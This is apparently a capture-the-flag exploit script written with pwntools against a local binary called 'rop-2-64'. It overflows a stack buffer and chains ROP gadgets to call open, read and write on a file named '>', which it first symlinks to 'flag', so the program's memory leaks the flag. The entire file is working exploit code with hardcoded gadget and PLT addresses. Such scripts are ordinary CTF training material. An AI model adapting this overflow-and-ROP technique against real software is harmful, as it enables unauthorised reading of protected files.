#!/usr/bin/env python

from pwn import *
import os

p = process("./rop-2-64")

buf = "A"*0x80+"BBBBBBBB"

f_open = p64(0x0000000000400510)
f_read = p64(0x00000000004004f0)
f_printf = p64(0x00000000004004e0)
f_write = p64(0x00000000004004d0)

s_gt = p64(0x400012)
#s_gt = p64(0x400036)
i_0 = p64(0)
i_3 = p64(3)
i_100 = p64(100)
x_buf = p64(0x601800)

"""
0x0000000000400743 : pop rdi ; ret
0x0000000000400668 : pop rdx ; ret
0x0000000000400741 : pop rsi ; pop r15 ; ret
"""

g_arg1 = p64(0x0000000000400743)
g_arg2_argx = p64(0x0000000000400741)
g_arg3 = p64(0x0000000000400668)

buf += g_arg1
buf += s_gt
buf += g_arg2_argx
buf += i_0
buf += p64(12345)
buf += g_arg3
buf += i_0
buf += f_open
buf += g_arg1
buf += i_3
buf += g_arg2_argx
buf += x_buf
buf += i_0
buf += g_arg3
buf += i_100
buf += f_read
buf += g_arg1
buf += p64(0x1)
buf += g_arg2_argx
buf += x_buf
buf += i_0
buf += g_arg3
buf += i_100
buf += f_write

if os.path.exists('>'):
    os.unlink('>')

os.symlink("flag",">")

"""
buf += f_read
buf += pop_pop_pop_ret
buf += i_3
buf += x_buf
buf += i_100

buf += f_printf
buf += pop_ret
buf += x_buf
"""

p.sendline(buf)
p.interactive()
